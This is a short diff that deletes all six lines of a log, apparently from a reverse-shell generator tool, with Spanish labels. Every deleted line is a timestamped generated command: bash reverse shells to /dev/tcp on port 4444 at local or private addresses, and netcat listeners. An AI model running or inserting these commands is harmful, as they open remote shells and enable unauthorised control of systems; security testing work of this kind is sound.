@@ -1,6 +1,0 @@
-[2025-12-31 18:36:54] CMD GENERADO: bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
-[2025-12-31 18:36:54] CMD GENERADO: bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
-[2025-12-31 18:37:18] CMD GENERADO: bash -i >& /dev/tcp/192.168.1.10/4444 0>&1
-[2025-12-31 18:37:19] CMD GENERADO: nc -lvnp 4444
-[2025-12-31 18:37:57] CMD GENERADO: nc -lvnp <PUERTO>
-[2025-12-31 18:52:48] CMD GENERADO: bash -i >& /dev/tcp/192.168.1.1/4444 0>&1
